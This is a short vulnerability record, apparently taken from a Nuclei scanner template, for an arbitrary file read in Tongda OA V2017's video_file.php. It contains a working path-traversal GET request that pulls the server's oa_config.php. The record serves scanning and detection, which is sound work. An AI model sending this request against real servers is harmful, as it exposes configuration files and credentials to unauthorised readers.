# Vulnerability: Tongda OA V2017 Video File - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`tongda-video-file-read.yaml`)

## Description
There is an arbitrary file reading vulnerability in Extreme OA video_file.php. An attacker can obtain sensitive files on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
```

